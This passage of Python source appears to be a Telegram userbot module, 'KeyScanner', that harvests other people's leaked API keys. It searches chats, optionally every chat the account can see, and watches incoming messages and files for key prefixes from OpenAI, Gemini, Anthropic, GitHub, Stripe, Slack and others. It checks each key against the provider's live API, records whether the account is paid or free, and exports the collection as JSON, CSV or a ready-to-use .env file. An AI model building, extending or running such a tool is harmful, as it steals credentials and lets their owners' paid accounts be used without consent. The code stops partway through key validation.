            "sk-", "AIza", "gsk_", "hf_", "r8_", "ghp_",
            "sk_live_", "xoxb-", "SG.", "secret_", "figd_",
        ]
        self._invalid_keys_cache: list = []
        self._edit_tasks: dict = {}
        self._recent_scan_fingerprints: dict = {}
        self._scan_semaphore = asyncio.Semaphore(3)
        self._max_file_scan_size = 1_500_000

    def _default_settings(self):
        return {
            "log_mode": "none",
            "file_scan": True,
            "edit_scan": True,
            "notify_new_keys": True,
            "list_compact": True,
            "list_page_size": 5,
            "default_sort": "recent",
            "auto_hide_keys": True,
            "log_target": {
                "chat_id": None,
                "thread_id": None,
                "topic_title": "Logs",
            },
        }

    async def client_ready(self, client, db):
        self.client       = client
        self._client      = client
        self._db          = db
        self._keys        = self.get("keys_v2", {})
        self._auto_chats  = self.get("auto_v2", [])
        self._paid_status = self.get("paid_status", {})
        self._key_meta    = self.get("keys_meta_v1", {})
        self._model_cache = self.get("models_v2", {})
        if not isinstance(self._key_meta, dict):
            self._key_meta = {}
        if not isinstance(self._model_cache, dict):
            self._model_cache = {}
        self._settings    = self.get("ks_settings", self._default_settings())
        defaults = self._default_settings()
        if not isinstance(self._settings, dict):
            self._settings = defaults
        else:
            log_target = self._settings.get("log_target")
            self._settings = {**defaults, **self._settings}
            if not isinstance(log_target, dict):
                log_target = {}
            self._settings["log_target"] = {
                **defaults["log_target"],
                **log_target,
            }


        try:
            await self._bootstrap_heroku_logs()
        except Exception:
            pass

    async def _bootstrap_heroku_logs(self):
        """
        Finds or creates the heroku forum topic for key logs.
        Delegates to utils.asset_forum_topic — same helper used by Gemini and
        other modules. It handles find-or-create, deleted/stale topics, and
        Hikka-side caching internally, so we never need to re-implement that.
        """
        asset_channel = self._db.get("heroku.forums", "channel_id", 0)
        if not asset_channel:
            return None, None

        chat_ref = int(f"-100{asset_channel}")

        try:
            notif_topic = await utils.asset_forum_topic(
                self._client,
                self._db,
                asset_channel,
                "KeyScanner Logs",
                description="Automatic key catch logs.",
            )
        except Exception:
            return chat_ref, None

        if notif_topic is None:
            return chat_ref, None

        thread_id = notif_topic.id
        target = self._log_target()
        target["chat_id"] = chat_ref
        target["topic_title"] = "KeyScanner Logs"
        target["thread_id"] = thread_id
        self._save()

        return chat_ref, thread_id

    def _save(self):
        self.set("keys_v2",     self._keys)
        self.set("auto_v2",     self._auto_chats)
        self.set("ks_settings", self._settings)
        self.set("paid_status", self._paid_status)
        self.set("keys_meta_v1", getattr(self, "_key_meta", {}))
        self.set("models_v2",   getattr(self, "_model_cache", {}))

    def _ensure_model_cache(self):
        cache = getattr(self, "_model_cache", None)
        if not isinstance(cache, dict):
            cache = self.get("models_v2", {})
            if not isinstance(cache, dict):
                cache = {}
            self._model_cache = cache
        return cache

    def _db_stats_text(self):
        total = len(self._keys)
        paid  = sum(1 for k in self._keys if self._paid_status.get(k) == "paid")
        free  = sum(1 for k in self._keys if self._paid_status.get(k) == "free")
        unk   = total - paid - free
        return self.strings["db_stats"].format(total=total, paid=paid, free=free, unk=unk)

    def _now_ts(self) -> int:
        return int(time.time())

    def _normalize_tier(self, tier: str | None) -> str:
        return tier if tier in {"paid", "free"} else "unknown"

    def _record_key_meta(self, key: str, provider: str, source_chat_id=None, via: str | None = None, models=None, tier: str | None = None):
        meta = self._key_meta.setdefault(key, {})
        meta.setdefault("first_seen", self._now_ts())
        meta["last_seen"] = self._now_ts()
        meta["provider"] = provider
        if source_chat_id is not None:
            meta["source_chat_id"] = source_chat_id
        if via:
            meta["via"] = via
        if models is not None:
            meta["models_count"] = len(models)
        if tier is not None:
            meta["tier"] = self._normalize_tier(tier)
        meta["hits"] = int(meta.get("hits", 0) or 0) + 1

    def _serialize_export_tokens(self, values) -> str:
        return ",".join(sorted({value for value in (values or []) if value}))

    def _parse_export_tokens(self, raw: str | None) -> set[str]:
        return {token for token in (raw or "").split(",") if token}

    def _toggle_export_token(self, raw: str | None, value: str) -> str:
        values = self._parse_export_tokens(raw)
        if value in values:
            values.remove(value)
        else:
            values.add(value)
        return self._serialize_export_tokens(values)

    def _export_candidates(self, tier_raw: str | None = "", provider_raw: str | None = "") -> dict:
        tiers = self._parse_export_tokens(tier_raw)
        providers = self._parse_export_tokens(provider_raw)
        out = {}
        for key, provider in self._keys.items():
            tier = self._normalize_tier(self._paid_status.get(key))
            if tiers and tier not in tiers:
                continue
            if providers and provider not in providers:
                continue
            out[key] = provider
        return out

    def _provider_stats_map(self) -> dict:
        summary = {}
        for key, provider in self._keys.items():
            item = summary.setdefault(provider, {"total": 0, "paid": 0, "free": 0, "unknown": 0})
            tier = self._normalize_tier(self._paid_status.get(key))
            item["total"] += 1
            item[tier] += 1
        return summary

    def _export_scope_label(self, tier_raw: str | None = "", provider_raw: str | None = "") -> str:
        tiers = sorted(self._parse_export_tokens(tier_raw))
        providers = sorted(self._parse_export_tokens(provider_raw))
        tier_map = {
            "paid": self.strings["export_scope_paid"],
            "free": self.strings["export_scope_free"],
            "unknown": self.strings["export_scope_unknown"],
        }
        tier_text = ", ".join(tier_map.get(t, t) for t in tiers) if tiers else self.strings["export_scope_all_tiers"]
        provider_text = ", ".join(providers[:4]) + (f" +{len(providers) - 4}" if len(providers) > 4 else "") if providers else self.strings["export_scope_all_providers"]
        return f"{tier_text} · {provider_text}"

    def _export_rows(self, data: dict) -> list[dict]:
        ordered_keys = self._sort_keys_for_view(list(data.keys()), "recent")
        rows = []
        for key in ordered_keys:
            provider = data[key]
            models = self._ensure_model_cache().get(key, [])
            meta = self._key_meta.get(key, {})
            rows.append(
                {
                    "key": key,
                    "provider": provider,
                    "tier": self._normalize_tier(self._paid_status.get(key)),
                    "models": models,
                    "models_count": len(models),
                    "first_seen": meta.get("first_seen"),
                    "last_seen": meta.get("last_seen"),
                    "source_chat_id": meta.get("source_chat_id"),
                    "via": meta.get("via"),
                    "hits": meta.get("hits", 0),
                }
            )
        return rows

    def _export_payload(self, data: dict, fmt: str, tier_raw: str = "", provider_raw: str = ""):
        rows = self._export_rows(data)
        scope = self._export_scope_label(tier_raw, provider_raw)
        scope_slug = re.sub(r"[^a-z0-9]+", "_", scope.lower()).strip("_") or "all"

        if fmt == "json_map":
            body = json.dumps(data, ensure_ascii=False, indent=4)
            return body.encode("utf-8"), f"keys_{scope_slug}.json", "JSON map"

        if fmt == "json_records":
            body = json.dumps(rows, ensure_ascii=False, indent=4)
            return body.encode("utf-8"), f"keys_{scope_slug}_records.json", "JSON records"

        if fmt == "jsonl":
            body = "\n".join(json.dumps(row, ensure_ascii=False) for row in rows)
            return body.encode("utf-8"), f"keys_{scope_slug}.jsonl", "JSONL"

        if fmt == "txt_keys":
            body = "\n".join(row["key"] for row in rows)
            return body.encode("utf-8"), f"keys_{scope_slug}_raw.txt", "TXT raw"

        if fmt == "txt_full":
            body = "\n".join(
                f"{row['key']} | {row['provider']} | {row['tier']} | {', '.join(row['models']) if row['models'] else '—'}"
                for row in rows
            )
            return body.encode("utf-8"), f"keys_{scope_slug}_full.txt", "TXT full"

        if fmt == "csv":
            sio = io.StringIO()
            writer = csv.writer(sio)
            writer.writerow(["key", "provider", "tier", "models_count", "models", "first_seen", "last_seen", "source_chat_id", "via", "hits"])
            for row in rows:
                writer.writerow(
                    [
                        row["key"],
                        row["provider"],
                        row["tier"],
                        row["models_count"],
                        ",".join(row["models"]),
                        row["first_seen"] or "",
                        row["last_seen"] or "",
                        row["source_chat_id"] or "",
                        row["via"] or "",
                        row["hits"] or 0,
                    ]
                )
            return sio.getvalue().encode("utf-8"), f"keys_{scope_slug}.csv", "CSV"

        env_buckets = {}
        for idx, row in enumerate(rows, start=1):
            prefix = re.sub(r"[^A-Z0-9]+", "_", row["provider"].upper()).strip("_") or "API"
            bucket = env_buckets.setdefault(prefix, 0) + 1
            env_buckets[prefix] = bucket
            row["env_name"] = f"{prefix}_API_KEY" if bucket == 1 else f"{prefix}_API_KEY_{bucket}"
        body = "\n".join(f"{row['env_name']}={row['key']}" for row in rows)
        return body.encode("utf-8"), f"keys_{scope_slug}.env", "ENV"

    def _text_might_contain_key(self, text: str) -> bool:
        if not text:
            return False
        return any(prefix in text for prefix in self.search_queries)

    def _recent_scan_cleanup(self):
        now = self._now_ts()
        stale = [key for key, ts in self._recent_scan_fingerprints.items() if now - ts > 900]
        for key in stale:
            self._recent_scan_fingerprints.pop(key, None)

    def _should_skip_scan(self, chat_id, message_id, text: str, via: str) -> bool:
        self._recent_scan_cleanup()
        fingerprint = f"{via}:{chat_id}:{message_id}:{hash(text)}"
        now = self._now_ts()
        if fingerprint in self._recent_scan_fingerprints:
            return True
        self._recent_scan_fingerprints[fingerprint] = now
        return False

    def _get_main_markup(self):
        return [
            [
                self._btn(self.strings["btn_list"], self.ks_list, (0, "all", self._settings.get("default_sort", "recent")), "primary"),
                self._btn(self.strings["btn_check_all"], self.ks_val_all, style="success"),
            ],
            [
                self._btn(self.strings["btn_export"], self.ks_exp_menu, style="primary"),
                self._btn(self.strings["btn_stats"], self.ks_stats, style="primary"),
            ],
            [
                self._btn(self.strings["btn_sort_paid_free"], self.ks_sort_paid_free, style="success"),
            ],
            [
                self._btn(self.strings["btn_settings"], self.ks_settings_menu, ("main",), "primary"),
                self._btn(self.strings["btn_clear"], self.ks_clr_menu, style="danger"),
            ],
        ]

    def _provider_filter_value(self, filter_mode: str | None):
        if isinstance(filter_mode, str) and filter_mode.startswith("provider:"):
            return filter_mode.split(":", 1)[1]
        return None

    def _filter_label(self, filter_mode: str) -> str:
        provider = self._provider_filter_value(filter_mode)
        if provider:
            return provider
        return self.strings.get(f"filter_label_{filter_mode}", filter_mode)

    def _filtered_keys(self, filter_mode: str) -> dict:
        provider = self._provider_filter_value(filter_mode)
        if provider:
            return {k: v for k, v in self._keys.items() if v == provider}
        if filter_mode == "paid":
            return {k: v for k, v in self._keys.items() if self._paid_status.get(k) == "paid"}
        if filter_mode == "free":
            return {k: v for k, v in self._keys.items() if self._paid_status.get(k) == "free"}
        return dict(self._keys)

    def _provider_summary(self):
        return sorted(self._provider_stats_map().items(), key=lambda item: (-item[1]["total"], item[0].lower()))

    def _normalize_sort_mode(self, sort_mode: str | None) -> str:
        if sort_mode in {"recent", "alpha", "provider", "tier"}:
            return sort_mode
        return self._settings.get("default_sort", "recent")

    def _setting_state(self, value: bool):
        return self.strings["state_on"] if value else self.strings["state_off"]

    def _page_size(self):
        size = self._settings.get("list_page_size", 5)
        if size not in {4, 5, 6, 8}:
            size = 5
        return size

    def _mask_key(self, key: str, hidden: bool = True):
        if not hidden:
            return key
        if len(key) > 12:
            return f"{key[:4]}{'*' * 8}{key[-4:]}"
        return f"{key[:2]}***{key[-2:]}"

    def _list_row_text(self, key: str):
        provider = self._keys.get(key, "Unknown")
        tier_icon = {"paid": "💳", "free": "🔋"}.get(self._paid_status.get(key, ""), "❓")
        masked = self._mask_key(key, True)
        if self._settings.get("list_compact", True):
            return f"{tier_icon} {provider} · {masked}"
        models = self._ensure_model_cache().get(key, [])
        suffix = f" · {len(models)} models" if models else ""
        return f"{tier_icon} {provider} · {masked}{suffix}"

    def _toggle_autocatch_target(self, target):
        if target is None:
            return False
        if target in self._auto_chats:
            self._auto_chats.remove(target)
            self._save()
            return False
        self._auto_chats.append(target)
        self._save()
        return True

    def _callback_chat_id(self, call):
        for source in (call, getattr(call, "message", None)):
            if source is None:
                continue
            chat_id = getattr(source, "chat_id", None)
            if chat_id is not None:
                return chat_id
        return None

    def _sort_keys_for_view(self, keys_list, sort_mode: str):
        sort_mode = self._normalize_sort_mode(sort_mode)
        if sort_mode == "recent":
            order = {key: idx for idx, key in enumerate(self._keys.keys())}
            return sorted(keys_list, key=lambda key: order.get(key, -1), reverse=True)
        if sort_mode == "provider":
            return sorted(keys_list, key=lambda key: ((self._keys.get(key) or "").lower(), key.lower()))
        if sort_mode == "tier":
            tier_weight = {"paid": 0, "free": 1, "unknown": 2, "": 2}
            return sorted(
                keys_list,
                key=lambda key: (
                    tier_weight.get(self._paid_status.get(key, "unknown"), 2),
                    (self._keys.get(key) or "").lower(),
                    key.lower(),
                ),
            )
        return sorted(keys_list, key=str.lower)

    def _parse_scan_args(self, raw_args: str, default_limit: int):
        tokens = [token for token in (raw_args or "").split() if token]
        global_mode = False
        limit = default_limit
        for token in tokens:
            low = token.lower()
            if low in {"global", "all", "-g", "--global"}:
                global_mode = True
                continue
            if token.isdigit():
                limit = int(token)
        return global_mode, limit

    def _is_autocatch_enabled_for(self, chat_id) -> bool:
        return GLOBAL_AUTOCATCH in self._auto_chats or chat_id in self._auto_chats

    async def _run_scan(self, message: Message, limit: int, global_mode: bool):
        target = None if global_mode else message.to_id
        progress_key = "global_scanning" if global_mode else "scanning"
        source = "Global Scan" if global_mode else getattr(message.to_id, "chat_id", "ScanLLM")
        via = "global" if global_mode else "scan"
        msg = await utils.answer(message, self.strings[progress_key].format(limit=limit))
        found = set()

        for query in self.search_queries:
            try:
                async for m in self.client.iter_messages(target, search=query, limit=limit):
                    if getattr(m, "raw_text", None):
                        found.update(self.key_regex.findall(m.raw_text))
            except FloodWaitError as e:
                wait = getattr(e, "seconds", None) or getattr(e, "x", 5)
                await asyncio.sleep(int(wait))
                try:
                    async for m in self.client.iter_messages(target, search=query, limit=limit):
                        if getattr(m, "raw_text", None):
                            found.update(self.key_regex.findall(m.raw_text))
                except Exception:
                    pass
            except Exception:
                pass
            await asyncio.sleep(0.4)

        valid_count = 0
        if found:
            async with aiohttp.ClientSession() as session:
                tasks = [self._validate_key(session, k) for k in found]
                results = await self._gather_chunked(tasks)
                for key, (prov, ok) in zip(found, results):
                    if ok and key not in self._keys:
                        valid_count += 1
                        await self._register_key(session, key, prov, source, via=via)
            self._save()

        await utils.answer(msg, self.strings["found"].format(valid_count=valid_count))

    def _style(self, kind: str | None):
        return {"danger": "danger", "success": "success", "primary": "primary"}.get(kind or "", None)

    def _btn(self, text: str, callback, args=None, style: str | None = None):
        btn = {"text": text, "callback": callback}
        if args is not None:
            btn["args"] = args
        btn_style = self._style(style)
        if btn_style:
            btn["style"] = btn_style
        return btn

    def _models_text(self, models, limit: int = 5, provider: str | None = None):
        models = [m for m in dict.fromkeys(models or []) if m]
        if provider:
            models = self._sort_models(provider, models)
        if not models:
            return "—"
        if len(models) <= limit:
            return ", ".join(models)
        return ", ".join(models[:limit]) + f" … (+{len(models) - limit})"

    def _sort_models(self, provider: str, models):
        models = [m for m in dict.fromkeys(models or []) if m]
        if not models:
            return []
        prov = (provider or "").lower()
        if prov == "gemini":
            def gemini_key(name: str):
                n = name.lower()
                version = (0, 0, 0)
                m = re.search(r"gemini-(\d+(?:\.\d+)*)", n)
                if m:
                    parts = [int(p) for p in m.group(1).split(".")]
                    version = tuple((parts + [0, 0, 0])[:3])
                tier_weight = 0
                for token, weight in (
                    ("pro-preview", 700),
                    ("pro", 650),
                    ("thinking", 600),
                    ("flash-preview", 550),
                    ("flash", 500),
                    ("preview", 450),
                    ("lite", 300),
                    ("experimental", 100),
                    ("experimental", 100),
                ):
                    if token in n:
                        tier_weight = max(tier_weight, weight)
                build = 0
                m2 = re.search(r"-(\d+)$", n)
                if m2:
                    build = -int(m2.group(1))
                return (-version[0], -version[1], -version[2], -tier_weight, build, n)
            return sorted(models, key=gemini_key)

        def generic_key(name: str):
            n = name.lower()
            weight = 0
            for token, w in (
                ("pro", 300),
                ("preview", 250),
                ("flash", 200),
                ("thinking", 180),
                ("standard", 140),
                ("lite", 120),
                ("mini", 100),
                ("small", 80),
                ("experimental", 20),
            ):
                if token in n:
                    weight = max(weight, w)
            ver = tuple(int(x) for x in re.findall(r"\d+", n)[:4])
            ver = tuple((list(ver) + [0, 0, 0, 0])[:4])
            return (-weight, tuple(-x for x in ver), n)
        return sorted(models, key=generic_key)

    def _model_names_normalized(self, models) -> list[str]:
        out = []
        for model in models or []:
            if not model:
                continue
            name = str(model).strip().lower()
            if "/" in name:
                name = name.rsplit("/", 1)[-1]
            out.append(name)
        return list(dict.fromkeys(out))

    def _openrouter_tier_from_models(self, models) -> str | None:
        names = self._model_names_normalized(models)
        if not names:
            return None
        if any(not name.endswith(":free") for name in names):
            return "paid"
        if all(name.endswith(":free") for name in names):
            return "free"
        return None

    def _openai_tier_from_models(self, models) -> str | None:
        names = self._model_names_normalized(models)
        if not names:
            return None
        free_only = ("omni-moderation", "text-moderation")
        billable = [name for name in names if not any(name.startswith(prefix) for prefix in free_only)]
        if billable:
            return "paid"
        return "free"

    def _anthropic_tier_from_models(self, models) -> str | None:
        names = self._model_names_normalized(models)
        if not names:
            return None
        if any(name.startswith("claude") for name in names):
            return "paid"
        return None


    def _log_target(self):
        target = self._settings.get("log_target", {}) or {}
        if not isinstance(target, dict):
            target = {"chat_id": None, "thread_id": None, "topic_title": "Logs"}
            self._settings["log_target"] = target
        target.setdefault("chat_id", None)
        target.setdefault("thread_id", None)
        target.setdefault("topic_title", "Logs")
        return target

    def _chat_to_text(self, chat_id):
        if chat_id is None:
            return "—"
        return f"<code>{chat_id}</code>"

    def _log_target_text(self):
        target = self._log_target()
        chat_id = target.get("chat_id")
        thread = target.get("thread_id")
        topic = target.get("topic_title") or "Logs"
        chat_text = self._chat_to_text(chat_id) if chat_id is not None else "—"
        thread_text = f"<code>{thread}</code>" if thread else "—"
        return f"{chat_text} · {thread_text} · <b>{topic}</b>"

    def _is_forum_chat(self, chat) -> bool:
        if chat is None:
            return False
        for attr in ("is_forum", "forum", "forum_enabled", "has_topics", "has_topics_enabled"):
            val = getattr(chat, attr, None)
            if val:
                return True
        return False

    async def _resolve_entity_best_effort(self, raw: str):
        raw = (raw or "").strip()
        if not raw:
            return None

        
        if raw.lstrip("-").isdigit():
            return int(raw)

        
        if raw.startswith("t.me/"):
            raw = "https://" + raw
        if raw.startswith("http://") or raw.startswith("https://"):
            parsed = urlparse(raw)
            host = (parsed.netloc or "").lower()
            path = parsed.path.strip("/")
            if host.endswith("t.me") or host.endswith("telegram.me"):
                
                if path.startswith("c/"):
                    parts = path.split("/")
                    if len(parts) >= 2 and parts[1].isdigit():
                        return int(f"-100{parts[1]}")
                
                if path and not path.startswith(("joinchat", "+")):
                    raw = "@" + path.split("/")[0]
        elif not raw.startswith("@") and re.fullmatch(r"[A-Za-z0-9_]{5,}", raw):
            raw = "@" + raw

        
        for meth in ("get_entity", "get_chat"):
            fn = getattr(self.client, meth, None)
            if callable(fn):
                try:
                    entity = await fn(raw)
                    if entity is None:
                        continue
                    for attr in ("id", "chat_id"):
                        val = getattr(entity, attr, None)
                        if isinstance(val, int):
                            return val
                    if isinstance(entity, dict):
                        for key in ("id", "chat_id"):
                            val = entity.get(key)
                            if isinstance(val, int):
                                return val
                    if isinstance(entity, int):
                        return entity
                except Exception:
                    pass

        
        if "joinchat" in raw or "/+" in raw or raw.startswith("https://t.me/+"):
            for meth in ("join_chat", "import_chat_invite_link", "joinChatByInviteLink", "joinChannelByInviteLink"):
                fn = getattr(self.client, meth, None)
                if callable(fn):
                    try:
                        entity = await fn(raw)
                        if entity is None:
                            continue
                        for attr in ("id", "chat_id"):
                            val = getattr(entity, attr, None)
                            if isinstance(val, int):
                                return val
                        if isinstance(entity, int):
                            return entity
                    except Exception:
                        pass

        return raw

    async def _create_forum_topic(self, chat_ref, title: str):
        title = (title or "Logs").strip()[:128] or "Logs"
        if chat_ref is None:
            return None

        try:
            entity = await self.client.get_entity(chat_ref)
        except Exception:
            return None

        if not isinstance(entity, Channel):
            return None

        forums_cache = self._forums_cache()
        entity_key = getattr(entity, "title", str(chat_ref))
        cached_topic_id = forums_cache.get(entity_key, {}).get(title)
        topic = None

        if cached_topic_id:
            try:
                topic_result = await self.client(
                    GetForumTopicsByIDRequest(peer=entity, topics=[cached_topic_id])
                )
                topic = topic_result.topics[0]
                if isinstance(topic, ForumTopicDeleted):
                    topic = None
                    forums_cache.get(entity_key, {}).pop(title, None)
            except Exception:
                topic = None
                forums_cache.get(entity_key, {}).pop(title, None)

        if topic is None:
            try:
                result = await self.client(
                    GetForumTopicsRequest(
                        peer=entity,
                        offset_date=None,
                        offset_id=0,
                        offset_topic=0,
                        limit=100,
                    )
                )
                for found_topic in result.topics:
                    if getattr(found_topic, "title", None) == title:
                        topic = found_topic
                        break
            except Exception:
                pass

        if topic is None:
            try:
                WATERMELON_EMOJI_ID = 5431815664017161984
                create_result = await self.client(
                    CreateForumTopicRequest(
                        peer=entity,
                        title=title,
                        icon_emoji_id=WATERMELON_EMOJI_ID if getattr(getattr(self.client, "heroku_me", None), "premium", False) else None,
                    )
                )
                thread_id = create_result.updates[0].id

                intro_text = self.strings.get(
                    "heroku_topic_intro",
                    "This topic is for automatic key logs. The first message is pinned for context and updates.",
                )
                intro_msg = await self.client.send_message(
                    entity=entity,
                    message=intro_text,
                    reply_to=thread_id,
                    parse_mode="html",
                )
                try:
                    await self.client.pin_message(entity, intro_msg, notify=False)
                except Exception:
                    try:
                        await self.client.pin_message(entity, getattr(intro_msg, "id", intro_msg), notify=False)
                    except Exception:
                        pass

                forums_cache.setdefault(entity_key, {})[title] = thread_id
                topic_result = await self.client(
                    GetForumTopicsByIDRequest(peer=entity, topics=[thread_id])
                )
                topic = topic_result.topics[0]
            except Exception:
                return None
        else:
            forums_cache.setdefault(entity_key, {})[title] = getattr(topic, "id", cached_topic_id)
            
            WATERMELON_EMOJI_ID = 5431815664017161984
            if (
                getattr(getattr(self.client, "heroku_me", None), "premium", False)
                and getattr(topic, "icon_emoji_id", None) != WATERMELON_EMOJI_ID
            ):
                try:
                    await self.client(
                        EditForumTopicRequest(
                            channel=entity,
                            topic_id=getattr(topic, "id", cached_topic_id),
                            icon_emoji_id=WATERMELON_EMOJI_ID,
                        )
                    )
                except Exception:
                    pass

        return topic

    def _topic_thread_id_from_result(self, result):
        if result is None:
            return None
        for attr in ("id", "message_thread_id", "thread_id"):
            val = getattr(result, attr, None)
            if isinstance(val, int):
                return val
        if isinstance(result, dict):
            for key in ("id", "message_thread_id", "thread_id"):
                val = result.get(key)
                if isinstance(val, int):
                    return val
        return None

    def _heroku_forums_chat(self):
        try:
            val = self._db.get("heroku.forums", "channel_id", None)
            if val:
                val = int(val)

                if val > 0:
                    val = int(f"-100{val}")
                return val
        except Exception:
            pass
        return None


    def _forums_cache(self):
        try:
            cache = self._db.pointer("heroku.forums", "forums_cache", {})
            if isinstance(cache, dict):
                return cache
        except Exception:
            pass
        try:
            cache = self._db.get("heroku.forums", "forums_cache", {})
            if isinstance(cache, dict):
                return cache
        except Exception:
            pass
        return {}

    async def _ensure_heroku_log_destination(self, create_if_missing: bool = True):
        try:
            chat_ref, thread_id = await self._bootstrap_heroku_logs()
            if chat_ref is None:
                asset_channel = self._db.get("heroku.forums", "channel_id", 0)
                if not asset_channel:
                    return None, None
                return int(f"-100{asset_channel}"), None
            return chat_ref, thread_id
        except Exception:
            asset_channel = self._db.get("heroku.forums", "channel_id", 0)
            if asset_channel:
                return int(f"-100{asset_channel}"), None
            return None, None

    async def _ensure_log_destination(self, create_if_missing: bool = True):
        """
        Resolves log destination for custom mode.
        Uses _create_forum_topic which handles find-or-create with stale cache
        cleanup. thread_id is persisted in _log_target() after first resolve.
        """
        target = self._log_target()
        chat_ref = target.get("chat_id")
        if chat_ref is None:
            return None, None

        topic_title = target.get("topic_title") or "Logs"
        topic = await self._create_forum_topic(chat_ref, topic_title)
        if not topic:
            return chat_ref, None

        thread_id = self._topic_thread_id_from_result(topic)
        if thread_id and thread_id != target.get("thread_id"):
            target["thread_id"] = thread_id
            self._save()
        return chat_ref, thread_id

    async def _send_log_text(self, text: str):
        mode = self._settings.get("log_mode", "none")
        if mode == "none":
            return

        if mode == "saved":
            try:
                await self.client.send_message("me", text, parse_mode="html")
            except Exception:
                pass
            return

        if mode == "heroku":
            target = self._log_target()
            chat_ref = target.get("chat_id")
            thread_id = target.get("thread_id")

            if not chat_ref or not thread_id:
                try:
                    chat_ref, thread_id = await self._bootstrap_heroku_logs()
                except Exception:
                    return
                if thread_id:
                    target = self._log_target()
                    target["chat_id"] = chat_ref
                    target["thread_id"] = thread_id
                    self._save()

            if not chat_ref or not thread_id:
                return
            try:
                await self.client.send_message(
                    chat_ref,
                    text,
                    parse_mode="html",
                    reply_to=thread_id,
                )
            except Exception:
                pass
            return

        if mode == "custom":
            chat_ref, thread_id = await self._ensure_log_destination()
            if chat_ref is None:
                return
            if not thread_id:
                try:
                    chat_obj = await self.client.get_entity(chat_ref)
                    if self._is_forum_chat(chat_obj):
                        return
                except Exception:
                    return
            kwargs = {"parse_mode": "html"}
            if thread_id:
                kwargs["reply_to"] = thread_id
            try:
                await self.client.send_message(chat_ref, text, **kwargs)
            except Exception:
                pass
            return


    def _provider_model_base(self, provider: str):
        mapping = {
            "OpenAI": ("https://api.openai.com/v1", "Bearer"),
            "DeepSeek": ("https://api.deepseek.com", "Bearer"),
            "Perplexity": ("https://api.perplexity.ai", "Bearer"),
            "Mistral": ("https://api.mistral.ai/v1", "Bearer"),
            "Together": ("https://api.together.xyz/v1", "Bearer"),
            "XAI": ("https://api.x.ai/v1", "Bearer"),
            "Fireworks": ("https://api.fireworks.ai/inference/v1", "Bearer"),
            "Novita": ("https://api.novita.ai/v3", "Bearer"),
            "SiliconFlow": ("https://api.siliconflow.cn/v1", "Bearer"),
            "DeepInfra": ("https://api.deepinfra.com/v1/openai", "Bearer"),
            "ZhipuAI": ("https://open.bigmodel.cn/api/paas/v4", "Bearer"),
            "Groq": ("https://api.groq.com/openai/v1", "Bearer"),
            "OpenRouter": ("https://openrouter.ai/api/v1", "Bearer"),
            "Anthropic": ("https://api.anthropic.com/v1", "x-api-key"),
        }
        return mapping.get(provider)

    async def _discover_models(self, session, key: str, provider: str):
        try:
            if provider == "Gemini":
                url = f"https://generativelanguage.googleapis.com/v1beta/models?key={key}"
                async with session.get(url, timeout=6) as r:
                    if r.status != 200:
                        return []
                    data = await r.json()
                    items = data.get("models") or data.get("data") or []
                    out = []
                    for item in items:
                        name = item.get("name") or item.get("model") or item.get("id")
                        if not name:
                            continue
                        out.append(name.rsplit("/", 1)[-1])
                    return out

            if provider == "Anthropic":
                headers = {"x-api-key": key, "anthropic-version": "2023-06-01"}
                async with session.get("https://api.anthropic.com/v1/models", headers=headers, timeout=6) as r:
                    if r.status != 200:
                        return []
                    data = await r.json()
                    items = data.get("data") or []
                    return [i.get("id") for i in items if i.get("id")]

            if provider == "OpenRouter":
                headers = {"Authorization": f"Bearer {key}"}
                async with session.get("https://openrouter.ai/api/v1/models", headers=headers, timeout=6) as r:
                    if r.status != 200:
                        return []
                    data = await r.json()
                    items = data.get("data") or []
                    return [i.get("id") for i in items if i.get("id")]

            base = self._provider_model_base(provider)
            if base:
                base_url, auth_type = base
                headers = {"Authorization": f"Bearer {key}"} if auth_type == "Bearer" else {"x-api-key": key}
                async with session.get(f"{base_url}/models", headers=headers, timeout=6) as r:
                    if r.status != 200:
                        return []
                    data = await r.json()
                    items = data.get("data") or data.get("models") or []
                    out = []
                    for item in items:
                        if isinstance(item, str):
                            out.append(item)
                            continue
                        name = item.get("id") or item.get("name") or item.get("model")
                        if name:
                            out.append(name)
                    return out
        except Exception:
            pass
        return []

    def _tier_from_models(self, provider: str, models):
        models = [m for m in (models or []) if m]
        if provider == "Gemini":
            paid_markers = (
                "veo", "lyria", "computer-use", "imagen", "2.5-pro", "3-pro",
                "preview", "experimental", "thinking", "ultra"
            )
            if any(any(tok in m.lower() for tok in paid_markers) for m in models):
                return "paid"
            return "unknown" if models else "unknown"
        if provider == "OpenRouter":
            return self._openrouter_tier_from_models(models)
        if provider == "OpenAI":
            return self._openai_tier_from_models(models)
        if provider == "Anthropic":
            return self._anthropic_tier_from_models(models)
        return None

    async def _register_key(self, session, key: str, provider: str, source_chat_id, via: str = "message"):
        models = await self._discover_models(session, key, provider)
        tier = await self._check_paid(session, key, provider, models=models)
        if tier in (None, "unknown"):
            tier = self._tier_from_models(provider, models) or "unknown"
        self._keys[key] = provider
        self._paid_status[key] = tier
        if models:
            self._ensure_model_cache()[key] = models
        else:
            self._ensure_model_cache().pop(key, None)
        self._record_key_meta(key, provider, source_chat_id, via=via, models=models, tier=tier)
        await self._handle_new_key(key, provider, source_chat_id, via=via)

    async def _handle_new_key(self, key: str, provider: str, source_chat_id, via: str = "message"):
        mode = self._settings.get("log_mode", "none")
        if mode == "none" or not self._settings.get("notify_new_keys", True):
            return
        text = self.strings["new_key_notif"].format(
            provider=provider, key=key, chat_id=source_chat_id, via=via
        )
        await self._send_log_text(text)

    async def _gather_chunked(self, tasks, chunk_size: int = 12):
        res = []
        for i in range(0, len(tasks), chunk_size):
            res.extend(await asyncio.gather(*tasks[i:i + chunk_size]))
            await asyncio.sleep(0.15)
        return res

    async def _process_text(self, text: str, chat_id, via: str = "message") -> int:
        """Extract, validate and store new keys from arbitrary text. Returns new-key count."""
        if not self._text_might_contain_key(text):
            return 0
        matches  = self.key_regex.findall(text)
        new_keys = [k for k in set(matches) if k not in self._keys]
        if not new_keys:
            return 0
        count = 0
        async with self._scan_semaphore:
            async with aiohttp.ClientSession() as session:
                tasks   = [self._validate_key(session, k) for k in new_keys]
                results = await self._gather_chunked(tasks)
                for key, (provider, is_valid) in zip(new_keys, results):
                    if is_valid:
                        count += 1
                        await self._register_key(session, key, provider, chat_id, via=via)
        if count:
            self._save()
        return count

    async def _validate_key(self, session, key: str):
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        try:
            if key.startswith("sk-or-v1-"):
                payload = {"model": "openrouter/auto", "messages": [{"role": "user", "content": "hi"}], "max_tokens": 1}
                async with session.post("https://openrouter.ai/api/v1/chat/completions",
                                        headers=headers, json=payload, timeout=5) as r:
                    return "OpenRouter", r.status == 200

            elif key.startswith("gsk_"):
